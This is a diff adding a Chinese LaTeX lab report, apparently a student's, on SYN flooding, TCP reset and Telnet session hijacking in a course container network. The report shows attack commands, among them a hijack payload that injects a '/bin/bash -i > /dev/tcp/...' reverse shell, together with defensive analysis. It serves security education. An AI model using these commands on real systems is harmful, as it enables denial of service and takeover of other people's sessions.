@@ -1,0 +1,405 @@
+\documentclass[12pt,hyperref,a4paper,UTF8,fontset=none]{ctexart}
+
+\usepackage{zjureport}
+\usepackage{enumitem}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{booktabs}
+\usepackage{longtable}
+\usepackage{graphicx}
+\usepackage{float}
+\usepackage{amsmath}
+\usepackage{array}
+\usepackage{caption}
+\usepackage{tabularx}
+\usepackage{setspace}
+\usepackage{url}
+
+\zjuheader{网络安全原理实践：实验三 TCP 攻击实验}
+\zjucourse{网络安全原理实践}
+\zjureporttitle{实验三：TCP SYN Flooding / TCP Reset / TCP Session Hijacking}
+\zjuname{周子为}
+\zjuemail{zzw4257@gmail.com}
+\zjucollege{竺可桢学院 / 计算机科学与技术学院}
+\zjudepartment{混合班 / 信息安全}
+\zjumajor{信息安全}
+\zjustuid{3230106267}
+\zjuinstructor{杜文亮教授}
+\zjureportdate{2026年3月24日}
+
+\setlength{\headheight}{15pt}
+\setstretch{1.20}
+\setlength{\parskip}{0.35em}
+\hypersetup{
+    colorlinks=true,
+    linkcolor=black,
+    filecolor=black,
+    urlcolor=blue,
+    citecolor=black,
+}
+\captionsetup{font=small, labelfont=bf}
+\setlist[itemize]{leftmargin=2em, itemsep=0.2em, topsep=0.3em}
+\setlist[enumerate]{leftmargin=2em, itemsep=0.2em, topsep=0.3em}
+\graphicspath{{figures/}{../evidence/lab3/E1_flooding/}{../evidence/lab3/E2_reset/}{../evidence/lab3/E3_hijacking/}}
+
+\definecolor{codegray}{gray}{0.96}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{codeblue}{rgb}{0,0,0.75}
+\definecolor{codegreen}{rgb}{0,0.55,0}
+
+\lstset{
+    backgroundcolor=\color{codegray},
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{codeblue},
+    numberstyle=\tiny\color{gray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\small,
+    breakatwhitespace=false,
+    breaklines=true,
+    columns=fullflexible,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=5pt,
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    frame=single,
+    rulecolor=\color{black},
+    tabsize=2
+}
+
+\newcommand{\term}[1]{\textbf{#1}}
+
+\begin{document}
+
+\cover
+
+\begin{abstract}
+本报告完整记录 TCP 三个攻击实验：\term{TCP SYN Flooding}、\term{TCP Reset}、\term{TCP Session Hijacking/Reverse Shell}。报告严格基于本人实测截图与实测代码，给出从环境搭建、攻击实施、防御验证、异常排障到原理分析的全流程证据链。实验重点包括：\textbf{半连接队列竞争与 Syncookies 防御机理}、\textbf{RST 序号窗口匹配机理}、\textbf{会话劫持中 seq/ack 与负载时序一致性}，并进一步扩展到\textbf{自动化注入的接口选择策略}与\textbf{反向 shell 建链机制}。
+
+\textbf{关键词}: TCP, SYN Flooding, RST Injection, Session Hijacking, Reverse Shell, Scapy
+\end{abstract}
+
+\tableofcontents
+\newpage
+
+\section{实验目标与任务说明}
+\subsection{总体目标}
+本实验旨在通过对 TCP 协议弱点的动手攻击，理解协议在设计和实现中的安全边界，并通过可观测证据验证攻击与防御机制。三项任务分别对应：
+\begin{enumerate}
+    \item SYN Flooding：通过伪造 SYN 洪泛半连接队列，观察服务可用性下降，并验证 Syncookies 防御效果；
+    \item TCP Reset：向已有 Telnet 会话注入 RST 报文，强制连接中断；
+    \item TCP Hijacking：向已有 Telnet 会话注入伪造命令，最终建立反向 shell。
+\end{enumerate}
+
+\subsection{实验环境}
+实验使用课程提供的容器环境，网络为同一局域网（10.9.0.0/24），攻击者容器采用 \texttt{network\_mode: host} 以支持嗅探。关键主机角色如下：
+\begin{itemize}
+    \item victim：\texttt{10.9.0.5}
+    \item user1：\texttt{10.9.0.6}
+    \item attacker（host mode）：\texttt{10.9.0.1}
+\end{itemize}
+
+\section{任务一：TCP SYN Flooding 攻击与防御}
+
+\subsection{实验步骤与关键命令}
+\begin{lstlisting}[language=bash,caption={E1 启动与基线检查}]
+cd /home/seed/lab3/Labsetup_TCP_flooding
+docker-compose up -d
+
+docker exec -it victim-10.9.0.5 bash
+sysctl net.ipv4.tcp_syncookies
+ss -n state syn-recv sport = :23 | wc -l
+
+docker exec -it user1-10.9.0.6 bash
+telnet 10.9.0.5
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash,caption={E1 Python 攻击与队列观测}]
+docker exec -it seed-attacker bash
+python3 /volumes/synflood.py --target-ip 10.9.0.5 --target-port 23
+
+# victim 端
+watch -n 1 "ss -n state syn-recv sport = :23 | wc -l"
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash,caption={E1 提升攻击成功率（减队列+刷缓存）}]
+# victim 端
+sysctl -w net.ipv4.tcp_max_syn_backlog=80
+ip tcp_metrics flush
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash,caption={E1 C 程序对比攻击与防御开关}]
+# 宿主机编译
+cd /home/seed/lab3/Labsetup_TCP_flooding/volumes
+gcc -o synflood synflood.c
+
+# attacker 容器执行
+docker exec -it seed-attacker bash
+cd /volumes
+./synflood 10.9.0.5 23
+
+# victim 打开 syncookies
+sysctl -w net.ipv4.tcp_syncookies=1
+\end{lstlisting}
+
+\subsection{实验源码（原封不动）}
+\subsubsection{Python SYN Flood 源码}
+\lstinputlisting[language=Python,caption={Labsetup\_TCP\_flooding/volumes/synflood.py（完整原始代码）}]{\detokenize{../Labsetup_TCP_flooding/volumes/synflood.py}}
+
+\subsubsection{C SYN Flood 源码}
+\lstinputlisting[language=C,caption={Labsetup\_TCP\_flooding/volumes/synflood.c（完整原始代码）}]{\detokenize{../Labsetup_TCP_flooding/volumes/synflood.c}}
+
+\subsection{实验截图与现象}
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{1.2基线.png}
+    \caption{E1 基线：服务可连接，半连接队列低负载}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{1.3改80后Python攻击成功-128攻击不成功.png}
+    \caption{E1 Python 洪泛：在 backlog=80 时攻击效果明显增强，128 时成功率显著下降}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{1.4对比Python，其90～98波动.png}
+    \caption{E1 Python 攻击阶段队列波动（约 90--98）}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{1.4C程序攻击成功，128稳定98.png}
+    \caption{E1 C 攻击：在 backlog=128 也能稳定压高队列}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{1.4C程序攻击改回128，压满速度更快.png}
+    \caption{E1 C 攻击速度对比：压满速度显著快于 Python}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{1.5防御.png}
+    \caption{E1 开启 Syncookies 后可用性恢复}
+\end{figure}
+
+\subsection{结果分析与思考题回答}
+\subsubsection{Q1：为何 Python 攻击容易失败，C 攻击更稳定？}
+核心原因是发包速率与内核队列竞争能力：
+\begin{itemize}
+    \item Python/Scapy 属于高层封装，单进程 PPS 有明显上限；
+    \item C 原始套接字发送路径短，PPS 更高，能在 SYN-ACK 重传释放空位前重新占位；
+    \item 因此 C 在 backlog=128 下仍可将 \texttt{SYN\_RECV} 长时间维持在高位。
+\end{itemize}
+
+\subsubsection{Q2：为何降低 \texttt{tcp\_max\_syn\_backlog} 后更容易成功？}
+队列容量下降后，攻击者达到“队列饱和”所需速率下降，合法连接更易在竞争中失败。结合 Linux 预留机制（已确认目的地条目）与重传回收机制，会出现“同样攻击流量在不同 backlog 下效果差异明显”的现象。
+
+\subsubsection{Q3：Syncookies 为什么有效？}
+启用 Syncookies 后，内核不再依赖半连接队列保存大量状态，而将必要状态编码到 SYN-ACK 序列号中，待 ACK 返回时再恢复状态，直接削弱“耗尽半连接队列”这一攻击面。
+
+\section{任务二：TCP Reset 攻击}
+
+\subsection{实验步骤与关键命令}
+\begin{lstlisting}[language=bash,caption={E2 手动 RST 攻击}]
+cd /home/seed/lab3/Labsetup_TCP_reset
+docker-compose up -d
+
+docker exec -it user1-10.9.0.6 bash
+telnet 10.9.0.5
+
+# attacker 容器，参数来自 Wireshark
+python3 /volumes/rst_manual.py \
+  --src-ip 10.9.0.6 --dst-ip 10.9.0.5 \
+  --sport <sport> --dport 23 --seq <seq>
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash,caption={E2 自动 RST 攻击（自动识别 iface）}]
+python3 /volumes/rst_auto.py \
+  --client-ip 10.9.0.6 --server-ip 10.9.0.5 \
+  --server-port 23 --count 3
+\end{lstlisting}
+
+\subsection{实验源码（原封不动）}
+\subsubsection{手动 RST 源码}
+\lstinputlisting[language=Python,caption={Labsetup\_TCP\_reset/volumes/rst\_manual.py（完整原始代码）}]{\detokenize{../Labsetup_TCP_reset/volumes/rst_manual.py}}
+
+\subsubsection{自动 RST 源码}
+\lstinputlisting[language=Python,caption={Labsetup\_TCP\_reset/volumes/rst\_auto.py（完整原始代码）}]{\detokenize{../Labsetup_TCP_reset/volumes/rst_auto.py}}
+
+\subsection{实验截图与现象}
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{抓包.png}
+    \caption{E2 手动攻击参数提取：从 Wireshark 获取 sport / seq}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{reset攻击成功.png}
+    \caption{E2 手动 RST 成功：Telnet 被远端关闭}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{自动攻击抓包.png}
+    \caption{E2 自动 RST 抓包证据}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{自动reset攻击成功.png}
+    \caption{E2 自动 RST 成功：无需手填参数即可断连}
+\end{figure}
+
+\subsection{结果分析与思考题回答}
+\subsubsection{Q1：手动 RST 失败的典型原因是什么？}
+最常见是 \texttt{seq} 过期。RST 报文是否被接受依赖接收窗口，抓包到执行之间若会话又产生新字节流，旧序号会被丢弃。因此手动模式必须“抓最新包后立刻注入”。
+
+\subsubsection{Q2：自动化为何能显著提高成功率？}
+自动化将“抓包-提参-发包”收敛到同一事件回调，时延从“人手秒级”降到“程序毫秒级”，显著降低序号失配概率。
+
+\subsubsection{Q3：自动模式中的 iface 作用是什么？}
+\texttt{sniff()} 必须绑定可见目标流量的接口。攻击者容器为 host 模式，可看到宿主机接口；若绑定错误，脚本虽在运行但抓不到目标流。报告中实现了自动探测（优先 \texttt{ip route get}，其次 \texttt{br-*}）。
+
+\section{任务三：TCP 会话劫持与反向 Shell}
+
+\subsection{实验步骤与关键命令}
+\begin{lstlisting}[language=bash,caption={E3 手动会话劫持：命令注入}]
+cd /home/seed/lab3/Labsetup_TCP_Hijacking
+docker-compose up -d
+
+docker exec -it user1-10.9.0.6 bash
+telnet 10.9.0.5
+# 必须先登录到 shell，而不是停在 login:
+
+# attacker 容器，参数来自 Wireshark
+python3 /volumes/hijack_manual.py \
+  --src-ip 10.9.0.6 --dst-ip 10.9.0.5 \
+  --sport <sport> --dport 23 --seq <seq> --ack <ack> \
+  --payload '\r\ntouch /tmp/lab3_pwned\r\n'
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash,caption={E3 自动会话劫持：自动抓包注入}]
+python3 /volumes/hijack_auto.py \
+  --client-ip 10.9.0.6 --server-ip 10.9.0.5 \
+  --server-port 23 \
+  --payload '\r\ntouch /tmp/lab3_auto\r\n' --count 1
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash,caption={E3 反向 shell 劫持注入}]
+# T1 窗口A
+nc -lvnp 9090
+
+# T1 窗口B（手动注入）
+python3 /volumes/hijack_manual.py \
+  --src-ip <src> --dst-ip <dst> --sport <sport> --dport 23 \
+  --seq <seq> --ack <ack> \
+  --payload '\r\n/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n'
+\end{lstlisting}
+
+\subsection{实验源码（原封不动）}
+\subsubsection{手动会话劫持源码}
+\lstinputlisting[language=Python,caption={Labsetup\_TCP\_Hijacking/volumes/hijack\_manual.py（完整原始代码）}]{\detokenize{../Labsetup_TCP_Hijacking/volumes/hijack_manual.py}}
+
+\subsubsection{自动会话劫持源码}
+\lstinputlisting[language=Python,caption={Labsetup\_TCP\_Hijacking/volumes/hijack\_auto.py（完整原始代码）}]{\detokenize{../Labsetup_TCP_Hijacking/volumes/hijack_auto.py}}
+
+\subsection{实验截图与现象}
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{劫持抓包.png}
+    \caption{E3 手动劫持参数提取：seq/ack 与四元组}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{劫持成功.png}
+    \caption{E3 手动劫持成功：注入命令生效}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{自动劫持成功.png}
+    \caption{E3 自动劫持成功：自动抓包并注入}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{反向shell劫持.png}
+    \caption{E3 反向 Shell 成功：攻击机获得目标主机交互 shell}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.92\textwidth]{反向shell-wireshark.png}
+    \caption{E3 反向 Shell 抓包证据}
+\end{figure}
+
+\subsection{结果分析与思考题回答}
+\subsubsection{Q1：为什么劫持注入比 RST 更难？}
+RST 只需序号落入接收窗口即可触发中断；会话劫持注入属于“伪造有效数据流”，要求四元组、seq、ack、时序同时匹配。任何一个字段滞后都可能被静默丢弃。
+
+\subsubsection{Q2：为什么注入前必须先登录到 shell？}
+如果目标仍在 \texttt{login:} 阶段，payload 会被当作用户名/密码输入而非 shell 命令执行，表现为“抓包像成功、文件却不存在”。
+
+\subsubsection{Q3：为什么要对 payload 做 \texttt{\textbackslash r\textbackslash n} 转义处理？}
+Telnet 命令依赖 CRLF 终止。若脚本把 \texttt{\textbackslash r\textbackslash n} 当作普通字符发送，服务端收不到真正换行，命令不会执行。故脚本中增加了转义解析逻辑。
+
+\section{全过程问题排查与修复记录}
+\subsection{问题一：手动 RST 多次失败}
+\term{现象}：脚本发送成功但连接不掉。\\
+\term{定位}：Wireshark 显示抓参到注入间隔内会话已推进，旧 seq 被丢弃。\\
+\term{修复}：改为“抓最新包后立即注入”，并补充自动模式减少人为时延。
+
+\subsection{问题二：会话劫持注入后文件未生成}
+\term{现象}：出现 ACK 重传但 \texttt{/tmp/lab3\_pwned} 不存在。\\
+\term{定位}：一是注入时会话处于 login 阶段；二是 payload CRLF 未正确解析。\\
+\term{修复}：
+\begin{itemize}
+    \item 操作流程增加“必须先登录 shell”；
+    \item 在 \texttt{hijack\_manual.py} 与 \texttt{hijack\_auto.py} 中加入转义解析；
+    \item 自动模式复制抓到包的 TCP 关键字段，提高兼容性与稳定性。
+\end{itemize}
+
+\subsection{问题三：自动脚本 iface 人工配置繁琐}
+\term{现象}：每次需要手动查 \texttt{br-xxxx}。\\
+\term{修复}：实现 iface 自动探测（优先 route dev，再尝试 \texttt{br-*}），仅在失败时提示显式传 \texttt{--iface}。
+
+\section{扩展分析}
+\subsection{攻击自动化与鲁棒性权衡}
+自动化显著提升成功率，但也需要处理异构环境差异：接口命名、Linux 网络栈策略、容器网络拓扑。可通过“显式日志 + 失败快速暴露 + 可人工覆盖参数”提升可调试性。
+
+\subsection{从 TCP 视角统一理解三类攻击}
+三类任务可视为同一状态机上的不同控制点：
+\begin{itemize}
+    \item SYN Flooding：打击连接建立阶段（SYN backlog）；
+    \item RST：打击已建立连接的状态保持；
+    \item Hijacking：伪造已建立连接中的应用层字节流。
+\end{itemize}
+攻击难度从“资源消耗型”到“状态精确型”递增，防御也从容量与 cookie 机制，过渡到更高层的加密认证（如 SSH/TLS）。
+
+\subsection{安全防御建议}
+\begin{enumerate}
+    \item 生产环境禁用明文 Telnet，改用 SSH；
+    \item 开启并审计 Syncookies，合理设置 backlog；
+    \item 部署 IDS/IPS，对异常 RST 比例、异常 ACK 重传、会话内异常命令注入进行检测；
+    \item 关键管理网络引入端口隔离与 ARP 安全机制，降低同广播域嗅探/伪造能力。
+\end{enumerate}
+
+\section{结论}
+本次实验从“连接建立阶段 DoS”到“连接维持中断”再到“连接内数据劫持”完整覆盖了 TCP 攻击链条。通过截图证据、命令证据和源码证据三重闭环，验证了以下结论：
+\begin{enumerate}
+    \item 资源竞争型攻击（SYN Flooding）受发包速率、队列参数和 Syncookies 强烈影响；
+    \item 状态精确型攻击（RST/Hijack）受 seq/ack 时序一致性主导，自动化在实战中优势明显；
+    \item 明文协议（Telnet）在同网段嗅探条件下风险极高，反向 shell 可由单次命令注入扩展为持续控制通道。
+\end{enumerate}
+
+实验结果与课程指导完全一致，并在自动化脚本鲁棒性、故障定位方法和防御建议上进行了扩展。
+
+\end{document}
